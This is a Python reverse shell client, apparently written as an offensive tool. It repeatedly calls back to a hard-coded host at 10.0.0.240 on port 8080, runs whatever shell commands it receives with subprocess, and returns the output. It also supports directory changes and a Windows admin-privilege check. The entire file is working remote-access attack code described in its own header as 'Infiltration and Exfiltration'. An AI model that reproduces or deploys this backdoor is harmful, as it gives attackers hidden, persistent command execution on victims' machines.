# client.py
# Works on Transmission Control Protocol (TCP)
# Keeps tuning to establish the connection with Server
# Change directory (executed 'cd' shell command)
# TCP bi-directional data transfer (Infiltration and Exfiltration)-CLIENT

import socket
import subprocess
import os
import time
import sys
import ctypes

def tuneConnection():
    mySocket = socket.socket()
    # Trying to connect to server every 20 seconds
    while True:
        time.sleep(20)
        try:
            mySocket.connect(("10.0.0.240", 8080))
            shell(mySocket)

        except:
            tuneConnection()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() !=0
    except:
        return False


def shell(mySocket):
    while True:
        command = mySocket.recv(5000)

        if 'terminate' in command.decode():
            try:
                mySocket.close()
                break
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())
                break

        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())


        elif "checkPrivilege" in command.decode():
            if is_admin():
                mySocket.send(b"[+] Running with Admin Privileges\n")
            else:
                mySocket.send(b"[+] User Privileges. (No Admin Privileges)\n")

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())


def main():
    tuneConnection()

main()
